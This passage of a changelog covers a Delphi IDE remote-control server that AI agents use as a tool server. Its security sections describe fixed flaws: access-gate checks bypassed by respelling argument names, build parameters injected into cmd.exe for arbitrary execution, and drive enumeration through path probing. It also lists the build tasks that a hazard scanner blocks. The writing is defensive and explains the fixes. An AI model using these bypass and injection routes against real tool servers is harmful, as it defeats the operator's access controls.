  or take it out again; the file stays on disk. Idempotent. The designer
  kind is read from the `.dfm`/`.fmx` root object and the class ancestor;
  binary designers fall back to the `.pas` declarations. `view` now lists
  `units` (name, file, form, and `dproj:false` when the `.dproj` lags).
- **`delphi_create kind=unit | frame-vcl | frame-fmx | datamodule`**: a
  plain unit, a frame (VCL/FMX) or a data module (its `{%CLASSGROUP}`
  follows the project's framework; the designer is a `.dfm` on both), each
  registered on creation. `form-vcl`/`form-fmx` now write their
  `<DCCReference>` too, so the Project Manager lists them at once.
- **`delphi_delete` of a unit** trashes its `.dfm`/`.fmx` with it and takes
  it out of every project in its folder or the parent folder that lists it.
- **`delphi_move` of a unit** moves the designer pair, rewrites the
  `unit X;` header on a rename, and re-points the projects that list it
  (relative include with backslash, form comment and `DCCReference` kept).

### Changed
- `Lsp.ProjectUnits` is the single place that edits project membership;
  `Lsp.Scaffold` no longer has its own `.dpr` registration code.


## [0.41.0-beta] - 2026-08-22

The second half of the "fat project on Linux" story: compiling was solved
by add-searchpath; RUNNING needs the native library a component loads at
runtime to travel with the binary. OBR for FireMonkey is static on
Android/iOS (that is why the project's manifest never mentioned it) but a
runtime `libzbar.so` on Linux and `.dylib` on macOS - and the manifest
had no Linux64 entries because the app had never been deployed there.

### Added
- **`delphi_config add-deployfile` / `remove-deployfile`**: the IDE's
  Deployment Manager, per platform. Adds a file to the `.deployproj` in
  the IDE's own shape (one ItemGroup per platform, one DeployFile per
  configuration, DeployClass File), generating the standard manifest
  first when the project has none (and its import line in the `.dproj`).
  `remotedir` defaults to the project folder on the target - next to the
  binary - or to the apk's `library\lib\<abi>\` for a `.so` on Android;
  it must be a simple relative folder. The file is vetted like any read
  and must exist. `view` lists the deployment entries per platform.

### Changed
- **Library read zone widened to component install roots**: the IDE
  registers a component's `Source\` (or per-platform `Lib\`), and next
  to it live `Library\`, `Redist\`, `Examples\` - the native runtime
  libraries a deployment must ship. One level above each registered
  folder is readable now (never a drive root). Measured: OBR's
  `Library\Linux64\libzbar.so` was unreadable before.
- **After a server update, live MCP sessions must reconnect** (field
  agent's report): clients cache `tools/list` at connect time, so a
  parameter added by the update is invisible to a session opened before
  it - the tool refuses with "Falta path" while the agent cannot send
  it. The refusals for the new parameters now say so; the operator's
  deploy ritual includes telling the agents to reconnect.


## [0.40.0-beta] - 2026-08-22

Born from the first "fat" project the field agent built for Linux: a real
FMX app (41 units, FireDAC, REST, third-party components) compiled for
Linux64 except for ONE unit per library - the components' folders were
registered in the IDE's library path for Windows/Android only, and a
platform added to a project inherits no search path from the others. No
tool could add one; the agent reported the wall and proposed exactly
this.

### Added
- **`delphi_config add-searchpath` / `remove-searchpath`**: the IDE's
  Project Options > Search path, per platform (or for every platform with
  `platform` empty). A curated edit of the `.dproj` that creates the
  platform's property groups exactly as the IDE lays them out (definer +
  values group) when they are missing, writes `DCC_UnitSearchPath` (the
  real, SINGULAR property name - measured: the plural is silently
  ignored by the targets), keeps the `$(DCC_UnitSearchPath)` chain, and
  backs the file up first. Paths are vetted like any read: macros
  expanded with the IDE's environment table, resolved from the project
  folder, inside the workspace or the read-only library zone, and
  existing. `view` now lists the search paths per platform group.
  Measured: the 41-unit app built and linked for Linux64 in 12 s after
  four calls (OBR for FireMonkey from source; TeeGrid Sources/FMX/Linux).

### Changed
- A read refused outside the jail now says that the library zone exists
  and what it covers (the folders the IDE registers and their subfolders,
  not their parents) - an agent listed a component's parent folder, got
  the plain jail refusal, and concluded list and read disagreed.


## [0.39.0-beta] - 2026-08-21

Born in the field: the Linux agent had to pull the 72 MB PAServer
installer with `delphi_fetch` - nine 11 MB base64 chunks, ~24M tokens
against a 262K context - and only survived by abusing a client-side
quirk. Bytes belong to HTTP, not to a model's context window.

### Added
- **`GET /files?path=srvd:\...` - direct download route** on the SAME
  HTTP host that serves `/mcp`: same port, same Bearer gate (both tokens -
  downloading is reading; `AnonymousReadOnly` applies), same read jail
  as `delphi_read`/`delphi_fetch` (workspace roots + read-only library
  zone). Streams the file with `Content-Disposition` and an
  **`X-File-SHA256`** header to verify with `sha256sum`. Directories,
  files outside the jail and unserved virtual units are refused by name
  (403) without touching disk; relative paths 400; other methods 405.
  Still "MCP only": one exe, no SMB, no SSH, no side door. Measured: the
  72 MB installer in 0.8 s with matching hashes.
- `delphi_fetch` hands out the link: every answer carries **`download`**
  (relative `/files?path=...`, the path URL-encoded in its virtual form)
  and `downloadNote` (the exact `curl`). **Files over 4 MB answer with
  the link only** - size, sha256, no chunk - unless the client opts into
  inline chunks explicitly with `maxbytes<=1048576` (a client without a
  shell). No new parameter to learn: the one that exists is the switch.
  In stdio mode (no HTTP host) nothing changes.

### Changed
- **Renamed to "Delphi IDE Remote MCP Server"** (repo slug
  `delphi-ide-remote-mcp`, previously `delphi-remote-mcp`): the name now
  says WHAT is being remote-controlled - the Delphi IDE's toolchain
  (RAD Studio: language server, MSBuild, GetIt packages, the SDK's adb),
  not the Delphi language in the abstract. GitHub redirects the old URL.

## [0.38.1-beta] - 2026-08-21

### Fixed
- **"Invalid pointer operation" on every shutdown** (operator field report;
  present for many versions, all three host modes): `TMCPManagerRegistry`
  is a reference-counted `TInterfacedObject`, and the HTTP server / stdio
  transport hold it as `IMCPManagerRegistry` - so freeing the server
  released the last reference and the registry destroyed ITSELF, after
  which `TMcpHost.Destroy`'s manual `FRegistry.Free` freed dead memory.
  The host now pins its own counted reference and lets reference counting
  own the registry. Measured A/B over stdio EOF teardown: pre-fix exit
  code 1, post-fix exit code 0.

## [0.38.0-beta] - 2026-08-21

Born from a hands-on sweep of the IDE's own `bin\` folder (operator's
lead): measuring `convert.exe` revealed that the REAL on-disk binary
`.dfm`/`.fmx` is not what our guard was looking for.

### Added
- **`delphi_components`** (29th tool, read level): the GENERAL answer to
  "what does this server have installed to program with" - every design
  package REGISTERED in the IDE (registry Known Packages + x64 + HKLM,
  the same list RAD Studio loads into its palette), whatever the install
  channel: GetIt, a vendor installer or manual. A GetIt-only listing
  (the first draft of this tool) misses everything installed outside
  GetIt; this one cannot. Description + `.bpl` per line, disabled
  packages marked, IDE-plumbing packages excluded, optional substring
  `filter`. A registry read - no process is even spawned. **No install
  by design** (operator decision): installing packages mutates the whole
  IDE and stays a human decision; a missing library is reported with
  `delphi_report`.

### Fixed
- **Binary designer detection was incomplete**: `delphi_edit` recognized
  only a raw `TPF0` stream at offset 0, but the real binary form written
  by the IDE (and `convert.exe`, measured byte by byte) wraps that stream
  in a 16-bit resource header starting with `$FF` - such a file passed
  the check and would have been treated as text. Designer files whose
  first byte is `$FF` are now refused as binary too (a text form always
  begins with object/inherited/inline, never `$FF`).

## [0.37.0-beta] - 2026-08-21

Born from an operator observation on the live tray: sixteen minutes of
request lines landed in the log window in ONE burst, all stamped with the
drain time - the old path queued one `TThread.Queue` closure per log line
with no cap, growing unbounded whenever the main thread failed to drain,
and nothing was ever persisted (that morning's post-mortem depended on the
operator copy-pasting the window by hand).

### Added
- **Persistent tray log with bounded memory** (`[Log]` in settings.ini):
  the live window stays as it was, but every `LinesPerFile` lines
  (default 2000) the block is saved to `logs\yyyymmdd-hhnnss.log` next to
  the exe and the memo restarts at zero. Rotation keeps the newest
  `MaxFiles` files (default 10). A controlled exit - tray menu or Windows
  logoff/shutdown - flushes the partial block too: the tail of a session
  is exactly what a post-mortem needs most.

### Changed
- Log producer rebuilt: any thread appends straight into a bounded buffer
  (5000 lines, drop-and-count beyond) under a critical section; a 500 ms
  timer drains it to the window on the main thread. Timestamps are taken
  when the line is PRODUCED, so the log tells when things happened, not
  when the window got to paint them.

### Fixed
- **`delphi_adb logcat` false "device lost" on big dumps** (field agent's
  report, reproduced 1:1 against the live device): the device-gone marker
  scan (v0.34.1) ran over the DUMP CONTENT - and a 5000-line Android
  system log naturally contains "failed to connect"/"offline" noise, so
  the scan false-positived and exited with the RAW dump inline (611KB),
  bypassing `filter`, the `out=` file and the 400-line cap in one move.
  The scan now runs only when adb itself exits nonzero; a device gone
  BEFORE the call was already answered by the `get-state` precheck.

## [0.36.0-beta] - 2026-08-21

Born from the field agent's first Phase-3 bug report: it hand-edited a
`.fmx` with VCL-isms, the build packaged it without a word (the compiler
only checks a form resource's TEXT GRAMMAR, never its semantics), and the
app died at form-load on the device - "exited cleanly", no stack trace,
hours of blind debugging.

### Added
- **Designer lint in `delphi_edit`** for text `.fmx`/`.dfm` - and no
  hand-written error rules (the operator's bar: "sin hardcodear"): every
  property line of the resulting file is resolved against **tables
  generated from the framework's own metadata**. Two offline dumpers
  (`tools\designer-meta-dump`, our release tools - the server never runs
  them) walk every linked TPersistent class with `{$STRONGLINKTYPES ON}`
  and classic published typinfo (`GetPropList` - the SAME metadata
  `TReader` streams against; `System.Rtti` hides properties under
  restricted `$RTTI`, measured), emitting classes, published properties
  (inheritance resolved), enum members and set elements into generated
  units (`Lsp.DesignerMeta.Fmx/Vcl.pas`, ~22k facts / 850+ classes,
  regenerate after a RAD upgrade). A second pass INSTANTIATES each
  component - allowed in the offline tool, never server-side - to record
  the class every class-typed property REALLY holds (`TLabel.TextSettings`
  declares `TTextSettings`, public-only; it holds `TLabelTextSettings`,
  which re-publishes - measured), because that is what the streaming
  resolves against.
- The resulting warnings speak the framework's own words: `Size.X` →
  *"X" no existe en TControlSize (publica: Width, Height,
  PlatformDefault)*; `taCenter` → *no es un valor de TTextAlign; validos:
  Center, Leading, Trailing*. Silence policy: unknown classes
  (third-party, user forms), classes without table data, collection
  items, binary blocks and list values are never judged - a lint false
  positive would poison trust. Warnings in the edit audit, not refusals;
  the build still cannot catch these (it only checks a form resource's
  text grammar) and at runtime the app dies at form load - on Android,
  silently (the Fase 3 field lesson that started this).

10 batteries / 572 checks / 0 failures.

## [0.35.0-beta] - 2026-08-21

Field lesson from the first small-model Android run: the server must
protect the CLIENT's context window, not just its own machine. The field
agent (a local 27B) drowned its 200k-token session by pulling a
2,400-line logcat inline - 312k tokens, four compressions, 13-minute
calls.

### Added
- **`delphi_adb logcat out=<file.txt|.log>`** - the dump goes to a file
  on the server (jailed, parents created, UTF-8) and the answer is a
  small JSON (`logfile`, `lines`, `size`) pointing the agent at
  `delphi_read` (which pages at 400 lines per call) and `delphi_search` -
  the same read-in-ranges pattern as `screenshot`+`delphi_fetch`.

### Changed
- **Inline logcat answers are capped at the newest 400 lines**, with an
  honest heading saying how many were captured and how to get the full
  dump (`out=` or a tighter `filter`). A small-context client can no
  longer sink itself with one call.

## [0.34.2-beta] - 2026-08-21

### Fixed
- **Malformed `arguments` no longer crashes the binder.** A `tools/call`
  with `arguments` absent, as an array (`[]`) or as a string reached
  `Tool.Execute` as nil and the parameter binder dereferenced it - an
  access violation on ANY tool (found via the production tray log: a
  client-side serialization slip sent `"arguments":[]`, and the AV
  reproduced deterministically). The MCP spec marks `arguments` optional:
  it is now normalized to `{}` at the single choke point (vendor
  `[local change]`, `TMCPToolsManager.ExecuteTool`), so parameter
  defaults apply. Regression in the HTTP battery: array, absent and
  string forms must answer without an AV.
- **`logcat lines=0` means the default** (300), not a range rejection -
  measured in the field: clients that type every parameter (hermes')
  send `0` for "unset".

10 batteries / 567 checks / 0 failures.

## [0.34.1-beta] - 2026-08-21

### Fixed
- **`delphi_adb` says so when the device is gone** (field, minutes after
  0.34.0: the EDA51's wifi adb dropped itself after idle). Every
  device-addressing command now recognizes adb's device-loss messages
  ("not found", "offline", "failed to connect"...) and appends the recovery
  path: retry `connect` to the SAME ip:port first (many devices keep the
  port - the EDA51 does, measured), else re-enable wireless debugging on
  the device and `discover` the new port (Android 11+ randomizes it). A
  lost device can no longer masquerade as an empty logcat - and since
  `logcat` on a missing device WAITS instead of erroring (measured:
  "- waiting for device -" until the timeout), it now pre-checks
  `get-state` and answers the absence instantly. Battery grows to 58
  checks; 10 batteries / 564 / 0.

## [0.34.0-beta] - 2026-08-21

The deploy half of the remote-target chain, closing the doctrine of the
whole feature: **the deploy target is always a parameter** - a PAServer
profile, an Android device hanging off the server - never implicitly the
agent's machine. The agent programs from anywhere; the devices live here.

### Added
- **`delphi_build target=Deploy`** with the `profile` parameter: compiles
  and deploys to the PAServer of a connection profile (Linux/macOS).
  `Deploy` always runs as `Build;Deploy` - a bare `/t:Deploy` re-ships the
  *previous* binary with today's date (the measured half-a-session trap).
  When the project has no `.deployproj`, a minimal one (the project output,
  exec bit on) is generated in the IDE's own format and the `.dproj` gains
  the import line the IDE writes - without that import msbuild fails
  MSB4057 with the manifest sitting right there (measured). An IDE-written
  manifest is always used as-is. Field-proven: Linux64 deploy to a live
  remote PAServer, binary landing in its scratch dir with the exec bit.
- **Android deploy without opening the IDE** - the apk chain from the
  command line, measured piece by piece against Embarcadero's own
  deployment targets: for `platform=Android*`, `target=Deploy` generates
  the complete staging-map `.deployproj` (the generated AndroidManifest and
  res XML, the default artwork, the libnative stubs, the compiled library -
  the same list the IDE's Deployment Manager writes), seeds
  `AndroidManifest.template.xml` from the product's ObjRepos, and adds
  fallback version properties (package `com.embarcadero.<project>`,
  minSdk 23) and the pre-dexed system-jar list (`EnabledSysJars`,
  enumerated from the product's `lib\android` - measured 88-of-88 identical
  to an IDE-written project; without it the apk assembles WITHOUT
  `classes.dex` and the device refuses it with "code is missing") to the
  `.dproj` - every property conditioned on being empty so anything the IDE
  ever writes wins, and existing files are never touched.
  The apk assembly itself (manifest merge, aapt2, dex, packaging, debug
  signing) is Embarcadero's own pipeline - nothing reinvented. On success
  the result declares the `.apk` as `output` with the install note.
- **`delphi_build` parameter `deviceid`** (`/p:DeviceId=`) - measured: the
  deployment targets only auto-install on iOS (`_InstallIpa`); an Android
  install is `delphi_adb`'s job with the built `.apk`.
- **New tool `delphi_adb`** (28 tools now) - the Android side of the
  doctrine: the devices hang off the SERVER machine while the agent
  programs from anywhere. `discover` (devices announcing wireless
  debugging on the server's network via mDNS, each with its `ip:port` - or
  the developer reads it off the device screen and hands it over),
  `devices` (adb's attached list - the IDE's deploy targets), `connect` /
  `disconnect` (attach over the network; the device asks to authorize the
  first time), `install` (a built `.apk`, path jailed), `run` (launch the
  installed app - the IDE's "Deploy and Run": `am start` on the FMX native
  activity, executing on the DEVICE, sandboxed by Android - `AllowRun`
  governs the server machine, not this), `logcat` (bounded dump `-d -t N`,
  optional in-server filter - remote debugging of the deployed app),
  `screenshot` (the device screen to a PNG on the server, downloaded with
  `delphi_fetch` - the agent's remote EYES; a direct `exec-out` redirect
  mangles the binary through the console, measured, so it captures on the
  device and pulls), `tap` (touch the screen at x,y measured on a
  screenshot) and `key` (a whitelisted navigation key -
  back/home/enter/appswitch/wakeup/arrows/tab, no free keycodes, no text
  injection - the remote HANDS). The adb binary is the IDE's own Android
  SDK's (`SDKAdbPath` in the `.sdk` files), discovered per install, never
  hardcoded. `discover`/`devices`/`logcat`/`screenshot` are read-level
  (looking changes nothing); `connect`/`disconnect`/`install`/`run`/
  `tap`/`key` are write-level (they mutate or execute). **Field-proven end
  to end on a real device**: an FMX app created entirely by tools
  (scaffold + exit button wired into `.pas` and `.fmx`), built, installed,
  launched, SEEN (screenshot with the app on screen), operated (tap on its
  own button) and exited (launcher on the next screenshot) on a Honeywell
  EDA51 over wifi adb - no IDE anywhere in the loop.
- Gate: one identifier rule (`BadDeviceToken`, charset of what adb itself
  prints) shared by `delphi_adb` `address`/`device` and `delphi_build`
  `deviceid`; `Deploy` joins the build target whitelist; build `profile`
  vetted by the same single rule as PAServer profile names; tap coordinates
  digits-only; the key name whitelisted in the tool and charset-vetted at
  the gate.
- **`[Adb] AllowedDevices` allowlist** (settings.ini, or
  `DELPHI_MCP_ADB_DEVICES`): when configured, the ONLY devices this server
  will address - outside the list, nothing, at BOTH access levels. An IP
  entry covers whatever port wifi debugging negotiates; a USB serial is
  listed as-is. With the list active every device-addressing command must
  name its `device` explicitly (an implicit target could be an unlisted
  device that happens to be the only one attached). Absent = unrestricted.
- New battery `tests/test_deploy_adb.py` (57 checks). **10 batteries,
  563 checks, 0 failures.**

## [0.33.0-beta] - 2026-08-21

The last link of the remote-target chain, built and field-proven the same
night: the SDK/sysroot pull. With it, the full cycle ran for the first time -
an agent's PAServer on Linux, its connection profile, the sysroot pulled to
the Windows side, and the very project that died at link the day before
producing a valid Linux64 ELF.

### Added
- **`delphi_paserver command=get-sdk`** - the last link of the remote-target
  chain: pulls the platform SDK/sysroot (the libraries the linker needs)
  from the live PAServer of a connection profile and registers it, so
  `delphi_build` links for that platform. Measured end to end against a real
  target the day it was built: 1,678 files / 1.9 GB pulled, GCC version
  auto-detected from the tree, `Linux64.sdk` written fully resolved (the
  IDE's own format - no MSBuild macros), and the very project whose build
  died at link (`cannot find -lgcc_s`) produced a valid ELF on the next try.
  C++ headers are deliberately not pulled (this server links Delphi);
  distro-layout differences (Ubuntu vs RedHat vs merged /lib) are optional
  pulls that skip when absent. Linux64 today; other platforms report their
  absence honestly.
- **`delphi_build` passes the SDK automatically**: for a remote platform,
  when `<Platform>.sdk` exists (written by get-sdk) it goes to msbuild as
  `/p:PlatformSDK=...` - EnvOptions.proj has no default for platforms the
  IDE's SDK Manager never configured. No behaviour change for Win/Android.
- Measured for the .sdk generator (the piece the docs do not tell): the
  Delphi Linux64 targets read `$(Profile_LibraryPath)` - a PROPERTY resolved
  at project-load - not the `ProfileLibrary` ITEMS (those feed a build-time
  target on the C++ side). An .sdk without that property imports cleanly,
  collapses paths in the debug target, and still fails the link.
- **`delphi_report` grows an `agent` id**: pass a short stable id (e.g.
  "hermes") and your reports land in their own subfolder under `reports/`,
  separate from other agents on the same server. The value is slugged by the
  server before touching the filesystem (the client still never supplies a
  path); without it, reports stay in the root folder as before. Also the
  seed of a wider per-client identity later.

### Changed
- The Linux install hint of `delphi_paserver command=packages` now carries
  two field-measured warnings from the first real remote PAServer install:
  a headless `paserver` whose stdin hits EOF spins its prompt at ~100% CPU
  (keep stdin open: `sleep infinity | ./paserver ...`), and `-passfile` with
  a plain-text password was rejected on login while `-password=<pwd>` inline
  authenticated - prefer the latter for ad-hoc runs.

## [0.32.0-beta] - 2026-08-21

The network half of PAServer, built the day the first live PAServer existed to
test it against: a field agent installed PAServer on its Linux machine using
only this server's tools (locate installer, chunked fetch with sha256, run),
then reported - through `delphi_report` - that no tool could register the
connection profile on the Windows side. This release closes exactly that gap.

### Added
- **`delphi_paserver command=add-profile`** - registers a connection profile
  against a live PAServer (`name`, `host`, `password`; optional `port` default
  64211, `platform` default Linux64). The profile file is written by RAD
  Studio's own `paclient.exe --local`, so the on-disk format - password
  encrypted included - is always the IDE's, never invented. `--passfile` was
  measured and rejected: it stores the passfile PATH in the profile, leaving
  the password in plain text on disk forever.
- **`delphi_paserver command=test-connection`** - two forms. With `name`: the
  full PAServer handshake (connect + authenticate) through that profile, exit
  code and paclient output included. With `host`+`port` and NO name: a raw
  TCP reachability probe with elapsed time - the quick "does this server
  reach my PAServer at all?" answer an agent needs before chasing
  credentials, requested from the field (the agent behind NAT had no way to
  ask whether the server could reach it).
- **Secret masking in the transport logs.** The HTTP and stdio transports log
  each raw request body before the tool gate runs, so the PAServer password
  in `add-profile` arguments would have landed in the server log. A masker in
  the vendored logger (`MaskSecretValues`, `[local change]`) now blanks the
  values of `password`/`passkey`/`passfile`/`token` keys in every logged
  request line. Verified by the new battery: the password never appears in
  the log, the masked request does.
- New E2E battery `tests/test_paserver.py` (29 checks): the three read
  commands, gate vetting of every argument, a real profile written and
  encrypted, both test-connection forms, read-only refusals, log masking,
  cleanup. Total across batteries: 498 checks.

### Fixed
- **Tray mode: minimize now goes to the tray.** With `MainFormOnTaskbar` off,
  a VCL minimize targets the hidden application window - the log window
  neither minimized nor returned to the tray. Minimize is now intercepted
  (`SC_MINIMIZE`) and hides the window, matching the close button's
  close-to-tray behaviour.

### Security
- `add-profile`/`test-connection` are write-gated: read-only credentials keep
  the three listing commands only. All five arguments are vetted at the
  single gate (`PAServerArgDenied`): profile name doubles as a file name
  (strict charset, max 64), host/port/platform whitelisted, password may not
  carry quotes or control characters. The platform list is paclient's own
  (`PACLIENT_PLATFORMS`), narrower than the .dproj whitelist.

### Changed
- **Renamed to "Delphi Remote MCP Server"** (repo slug `delphi-remote-mcp`). The
  old "DelphiLSP" name implied a language-server bridge; this is an MCP server to
  control Delphi remotely, and DelphiLSP backs only 7 of the 27 tools. GitHub
  keeps the old URL redirecting. The README now lists, by name, exactly which 7
  tools use DelphiLSP and which 20 do not.
- Deliberately **unchanged** (to not break configured clients): the MCP
  `serverInfo.name` (`delphi-lsp-mcp-service`), the Windows service name and the
  executable name (`DelphiLspMcp.exe`). Those are identifiers, not branding.

## [0.31.0-beta] - 2026-08-20

It can finally run the way a server is supposed to run: as a Windows Service,
started by the machine, with no one logged in. Getting there meant collapsing
the two projects into one, which was overdue for its own reasons - two projects
meant two `uses` clauses to keep in sync by hand, and a tool unit added to one
and forgotten in the other silently gave that host fewer tools.

### Added
- **Windows Service mode.** `DelphiLspMcp.exe -install` (elevated) registers it,
  `-uninstall` removes it, and the SCM starts it like any service. The install
  bakes the mode switch into the registered `ImagePath`, because running with
  no arguments is the terminal mode - without that the SCM would launch a
  console that never answers it. Verified end to end: install, start, serve MCP,
  a real tool call, stop, uninstall.
- **One executable, three modes.** No switch = terminal (stdio, or `--http` for
  the remote mode); `-service` = Windows Service; `-gui` = the tray app. Each
  spelling is accepted as `/x`, `-x` or `--x`.

### Changed
- **The two projects are now one.** `DelphiLspMcpTray.dproj` is gone: the tray
  is a mode of the single project. A host can no longer expose fewer tools than
  another, because there is only one unit list.
- **`Lsp.Host` builds the server for every mode.** The manager registry, the
  single access gate, its outbound filter and the vault declaration were
  written out inline in the console host AND again in the tray - a policy added
  to one copy and forgotten in the other is a hole that exists on one host
  only. Built once now; the service was never going to be a third copy.
- The startup facts an operator needs (the write jail, the vault, the
  credential situation) come from one place and are reported by all three
  modes, instead of each host deciding for itself what was worth saying.

### Fixed
- **The tray had no icon at all** - not even a stock one. `TTrayIcon` had
  `Visible=True` with nothing assigned, the repo shipped no `.ico`, and neither
  project declared an application icon, so the notification area showed a blank
  slot. Two original icons now ship (running and stopped), the project declares
  one, and the tray assigns it.

### Documentation
- The README leads with what this is - an MCP server to control Delphi
  remotely, so you can develop from any platform - instead of implying a
  language-server bridge, and adds a table of **what each tool actually runs
  on**: 7 of the 27 tools are backed by DelphiLSP, the other 20 are MSBuild,
  git, the safe editing engine, the filesystem and the vault.
- `ARCHITECTURE.md`, `ROADMAP.md` and `firewall-allow.ps1` brought in line with
  the merge: they still described two hosts and matched a tray exe that no
  longer exists.

### Tests
- **The batteries no longer trigger a Windows Firewall prompt on every run.**
  It was never the server: `test_http_auth` copied the exe into a fresh random
  temp folder each run and let it listen on all interfaces, and the firewall
  decides per program path - so every run looked like a new program and asked
  again, leaving a dead rule behind (forty had piled up). The tests bind
  loopback now, where they already connect.
- **One scratch folder with fixed names**, `%TEMP%\delphi-mcp-tests\<battery>`,
  instead of eleven differently-named ones (several with the pid in the name).
  A stable path is also what stops the firewall prompt above. The cleanup now
  clears the read-only bit git leaves under `.git\objects` and asserts the
  folder is really gone - a cleanup that fails silently had been skipping three
  clone/pull checks with no failure to show for it.

## [0.30.0-beta] - 2026-08-20

A security release. The field audit that opened round 10 reported one real
issue; auditing our own answer to it turned up four more, three of them worse
than the original. Every one belongs to the same family: **two pieces of the
server disagreeing about what a request says**. The gate read an argument name
one way and the binder another; a drive letter counted as "served" on the way
out but not on the way in; a value was a number to the client and a shell
fragment to `cmd.exe`. Where two readings existed, there is now one.

### Security
- **The entry gate now reads arguments exactly as the binder resolves them.**
  It used `TJSONObject.TryGetValue` (case-sensitive) while the RTTI binder
  normalizes case and `_`, so a parameter spelled `Args` or `Com_mand` was
  invisible to the gate and fully visible to the tool: every decision the gate
  makes - read-only status, git option whitelist - could be walked past by
  respelling. One shared rule now (`TMCPSerializer.NormalizeKey`, exposed as a
  marked local change), read through a single `ArgStr` helper.
- **Duplicate parameter names are refused.** Two keys that normalize to the
  same name let the gate vet one value while the binder passed the tool the
  other. No client emits duplicates; the ambiguity is refused rather than
  resolved by guessing.
- **`delphi_build` validates `platform`, `config` and `target`.** They reached
  an unquoted `cmd.exe` line (`rsvars.bat && msbuild ...`), so a metacharacter
  was arbitrary execution - past `AllowRun`, the workspace jail, the
  low-integrity sandbox and the `.dproj` hazard scanner at once, defeating the
  server's central promise that it compiles and never runs. `platform` reuses
  the whitelist that already existed for the `.dproj` XML sink; `target` is a
  fixed trio; `config` stays open to project-defined names but admits no shell
  metacharacter.
- **A workspace root can no longer be deleted or moved.** `delphi_delete` and
  `delphi_move` park their target in a trash folder created next to it - for a
  root that lands in the root's *parent*, a write outside the jail, taking the
  whole workspace with it. Refused for every credential.
- **An exception escaping a tool no longer bypasses drive masking.** The
  dispatcher wraps any exception as `Error executing tool: <message>`, and a
  Delphi I/O exception embeds the real absolute path. The three byte-fidelity
  exemptions (`delphi_read`, `vault_read`, `vault_search`) only cancelled on a
  lower-case `error`, so that wrapper travelled unmasked. Matched by exact
  token, case-sensitively: a loose test would mask real file content and break
  anchored writes.
- **An unserved virtual unit never reaches the filesystem.** `srvz:\x` was
  expanded to the real `Z:\x` and echoed in the rejection, so probing
  `srva:`..`srvz:` enumerated the host's drives. Only served letters expand
  now; anything else is refused by name, listing the units that do work.
- **The knowledge vault is a served root of its own.** Its drive joins the
  served set alongside the workspace roots and the library zone; a vault on
  another letter used to leak that letter unmasked and its `srvX:` form did not
  resolve inbound.

### Changed
- **A wrong argument value is an error, not a silent default.** A string that
  is not a number became `0` and any boolean but `true` became `False`, so an
  agent believed it had filtered when it had not - a plausible wrong answer,
  the worst failure for a client that cannot see the server. Unreadable values
  now name the parameter and what was expected. Values that parse cleanly are
  still accepted whatever their JSON type (`"5"`, `"TRUE"`), so lenient clients
  keep working.
- **JSON `null` means "not provided".** It used to reach the binder's string
  path, where `TJSONAncestor.Value` yields the literal `'null'`: a null number
  became `0` and a null string became the four characters `null`.
- **`delphi_report` is bounded** (256 KB per report, counted over message,
  title and from). It is the only write a read-only - even anonymous -
  credential may perform, so it was also the only way such a client could grow
  the server's disk. A folder quota with a retention policy is roadmap.
- The virtual-unit shape is recognized in exactly one place
  (`VirtualUnitLetter`), used by both the inbound expansion and the rejection.

### Documentation
- `settings.example.ini` documents `AllowBuildScripts`, which existed and was
  described in the README but was missing from the template.

### Tests
- 468 checks across 8 batteries (was 423), every new fix paired with the vector
  it closes *and* with a counter-test that proves it did not over-tighten: a
  project-defined configuration name with a space still builds, content that
  merely starts with "Error" is still returned verbatim, numeric strings still
  bind, and deleting a file inside a root still works.

## [0.29.0-beta] - 2026-08-20

Field lesson from the first remote deploy (OpenCode agent bringing a freshly
built exe to its own machine): the build succeeded in seconds, then the agent
spent ~20 calls hunting the exe, because `delphi_list` hid the build-output
folders it had every reason to look in. A stateless protocol means the agent
only knows what each result tells it - so results must leave it ready for the
next step, the same way a rejection offers the legitimate path.

### Changed
- **`delphi_list` filters IDE artifacts RELATIVE to the requested root.**
  Naming a build-output folder (`Compiled\Win32\Release`...) as `root` is
  explicit consent to see inside it: its files and subdirectories are now
  listed. Listings from above still hide build output, but the result now
  carries `hidden` (how many entries the artifact filter removed) and a
  `note` telling the agent how to see them - before, the folder simply
  answered empty while `delphi_fetch` served the same path, and the
  contradiction cost the field agent four minutes of blind guessing.
- **`delphi_build` declares the artifact it produced.** On success the result
  now carries `output` (the built .exe/.dll/.bpl, resolved from the .dproj's
  `DCC_ExeOutput`/`DCC_BplOutput` or the IDE default and verified ON DISK),
  `outputSize`, and an `outputNote` pointing at `delphi_package` +
  `delphi_fetch` for retrieval.
- **The tray host announces its version** in the startup log line, the window
  caption and the tray icon hint (before, no way to tell WHICH build was
  serving without calling `initialize`).

### Docs
- `docs/CLIENTS.md`: how to receive `delphi_fetch` chunks through OpenCode,
  whose client truncates oversized tool output to a local spool file - the
  spool IS the transport (one-line PowerShell decode included), plus the
  recommended `build` -> `package` -> `fetch` flow for binaries.

8 E2E batteries, **423 checks** (new: relative artifact filtering with
`hidden`+`note`, explicit root inside build output, `delphi_build`
`output`/`outputSize`/`outputNote`).

## [0.28.0-beta] - 2026-08-20

Field round 9, second pass. One confirmed data-loss bug (concurrency) fixed, and
the build hazard scanner narrowed so it stops rejecting legitimate projects - the
tester's "a false positive is as serious as a hole".

### Security
- **CONCURRENT vault writes lost data, silently.** A knowledge vault is shared by
  several remote agents, so two of them appending to the same note at once is
  normal - but the read -> backup -> write cycle of `vault_append`/`vault_patch`
  was not serialized. Both read the same base and the last save erased the
  other's addition, while BOTH callers got an "ANADIDO ... copia previa" success;
  and two backups of one note in the same second collided at the copy step. The
  whole cycle now runs under one process-wide lock (`vault_create` too), so every
  reported success is really on disk. The append and patch write paths were
  unified into a single locked helper so the fix lives in one place.
- **git `clone` now inserts `--` before the URL**, so the URL can never be parsed
  as an option whatever it contains (defence in depth over the existing
  leading-`-` check and the gate's dangerous-flag filter). User options still
  apply - they go before the `--`.

### Changed
- **The build hazard scanner no longer refuses an INERT custom `<Target>`.**
  Rejecting *every* `<Target>`/`<Exec>` was a false positive as serious as a
  hole: it broke real projects with a post-build copy or Authenticode signing.
  The scanner now refuses only tasks that **execute a program or plant/delete
  files** (`Exec`, `UsingTask`, inline `Code`, `Copy`/`Move`/`Delete`/`MakeDir`/
  `WriteLinesToFile`/`WriteCodeFragment`/`DownloadFile`, compilers...). A target
  that only prints a `<Message>` or sets a property now builds.
- **New opt-in `[Security] AllowBuildScripts` (env `DELPHI_MCP_ALLOW_BUILD_SCRIPTS`).**
  A *trusted* project that signs or copies at build time can be enabled WITHOUT
  turning on `delphi_run` (which `AllowRun` would). `AllowRun` still implies it.
  Untrusted uploads with no opt-in still hit the scanner. Both default to off.

